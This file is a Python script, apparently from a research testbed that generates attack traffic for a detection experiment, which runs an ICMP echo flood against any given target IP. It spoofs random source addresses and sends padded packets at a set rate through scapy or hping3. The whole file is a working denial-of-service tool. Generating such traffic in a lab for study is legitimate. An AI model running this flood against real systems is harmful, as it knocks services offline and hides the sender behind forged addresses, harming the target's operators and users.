#!/usr/bin/env python3
"""ICMP echo flood from h4  (Table VII: 15% share, target CR 99%)."""
from __future__ import annotations
import argparse, random
from attacks._common import HAVE_SCAPY, hping3, scapy_train, target_pps


def run(target_ip: str, duration_s: float = 30.0, seed: int = 42) -> None:
    rng = random.Random(seed); pps = target_pps(rng)
    if HAVE_SCAPY:
        from scapy.all import IP, ICMP, Raw
        scapy_train(lambda r: IP(src=f"10.0.{r.randint(1,254)}.{r.randint(1,254)}", dst=target_ip)
                    / ICMP() / Raw(b"\x00" * 256), pps, duration_s, seed)
    else:
        hping3(["--icmp", "-d", "256", "-i", f"u{int(1e6/pps)}", "--rand-source", target_ip])


if __name__ == "__main__":
    a = argparse.ArgumentParser(); a.add_argument("target"); a.add_argument("--duration", type=float, default=30.0)
    a.add_argument("--seed", type=int, default=42); n = a.parse_args(); run(n.target, n.duration, seed=n.seed)
